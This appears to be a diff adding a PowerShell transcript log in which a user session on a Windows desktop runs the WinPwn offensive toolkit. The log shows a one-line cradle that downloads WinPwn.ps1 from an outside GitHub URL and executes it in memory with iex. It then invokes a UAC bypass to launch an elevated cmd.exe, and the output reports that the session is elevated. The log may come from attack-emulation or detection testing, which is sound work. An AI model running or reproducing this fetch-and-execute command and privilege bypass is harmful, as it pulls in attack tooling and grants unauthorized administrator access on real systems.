@@ -1,0 +1,71 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230411153159
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic}
+进程 ID: 18720
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic}
+Creating/Checking Log Folders in  C:\Users\wangjian\AppData\Local\Temp directory:
+
+
+    目录: C:\Users\wangjian\AppData\Local\Temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2023/4/11     15:32                LocalRecon
+d-----         2023/4/11     15:32                DomainRecon
+
+
+    目录: C:\Users\wangjian\AppData\Local\Temp\DomainRecon
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2023/4/11     15:32                ADrecon
+
+
+    目录: C:\Users\wangjian\AppData\Local\Temp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2023/4/11     15:32                LocalPrivEsc
+d-----         2023/4/11     15:32                Exploitation
+d-----         2023/4/11     15:32                Vulnerabilities
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> UAC Bypass
+
+[!] Session is elevated!
+PS>TerminatingError():“系统错误。”
+>> TerminatingError():“系统错误。”
+>> $global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230411153232
+**********************
